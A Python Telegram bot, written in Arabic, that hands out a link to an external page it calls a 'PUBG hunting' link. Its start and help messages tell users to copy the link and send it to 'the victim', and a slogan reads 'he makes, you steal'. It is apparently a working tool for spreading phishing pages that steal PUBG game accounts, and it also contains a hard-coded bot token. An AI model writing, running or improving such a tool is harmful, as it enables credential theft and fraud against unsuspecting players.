import requests, time, json

TOKEN = "8561526275:AAECcmOCELPUOQdTNJnbAWqn-dKP5CEnFhg"
ADMIN_ID = "8588873632"
IMAGE_URL = "https://i.postimg.cc/yxDT152H/file-00000000ed948210ac79b26b444be910.png"
PUBG_LINK = "https://ind11exh.vercel.app/"

def send_photo(chat_id, text, keyboard=None):
    try:
        data = {"chat_id": chat_id, "photo": IMAGE_URL, "caption": text, "parse_mode": "Markdown"}
        if keyboard: data["reply_markup"] = json.dumps(keyboard)
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data=data, timeout=15)
    except: pass

def get_updates(offset=0):
    try:
        r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates",
                         params={"offset": offset, "timeout": 10}, timeout=15)
        return r.json().get("result", [])
    except: return []

def get_buttons():
    keyboard = [
        [{"text": "🎮 رابط صيد ببجي", "callback_data": "pubg"}],
        [{"text": "🆘 مساعدة", "callback_data": "help"}],
    ]
    return {"inline_keyboard": keyboard}

def handle_message(msg):
    chat_id = msg["chat"]["id"]
    text = msg.get("text", "")

    if text == "/start":
        send_photo(chat_id,
            "🔥 *KING-SAQR* 🔥\n"
            "━━━━━━━━━━━━━━━\n"
            "🎮 *بوت صيد ببجي* 🎮\n"
            "━━━━━━━━━━━━━━━\n"
            "💀 *اضغط على الزر عشان تاخد الرابط:*\n"
            "━━━━━━━━━━━━━━━\n"
            "👑 *حماصه يصنع أنت تسرق* 👾😼",
            get_buttons())

    elif text == "/help":
        send_photo(chat_id,
            "📌 *الاستخدام:*\n"
            "1. اضغط على زر الرابط\n"
            "2. انسخ الرابط\n"
            "3. ابعته للضحية\n"
            "━━━━━━━━━━━━━━━\n"
            "👑 *حماصه يصنع أنت تسرق* 👾😼",
            get_buttons())

def handle_callback(cb):
    chat_id = cb["message"]["chat"]["id"]
    data = cb["data"]

    if data == "pubg":
        send_photo(chat_id,
            "🎮 *رابط صيد ببجي*\n"
            "━━━━━━━━━━━━━━━\n"
            f"`{PUBG_LINK}`\n"
            "━━━━━━━━━━━━━━━\n"
            "⚠️ *انسخ الرابط وابعته للضحية*\n"
            "👑 *حماصه يصنع أنت تسرق* 👾😼",
            get_buttons())
    elif data == "help":
        send_photo(chat_id,
            "📌 *الاستخدام:*\n"
            "1. اضغط على الزر\n"
            "2. انسخ الرابط\n"
            "3. ابعته للضحية\n"
            "━━━━━━━━━━━━━━━\n"
            "👑 *حماصه يصنع أنت تسرق* 👾😼",
            get_buttons())

def main():
    print("🔥 بوت صيد ببجي يعمل...")
    last_id = 0
    while True:
        updates = get_updates(last_id + 1)
        for u in updates:
            last_id = u["update_id"]
            if "message" in u: handle_message(u["message"])
            elif "callback_query" in u: handle_callback(u["callback_query"])
        time.sleep(1)

if __name__ == "__main__":
    main()
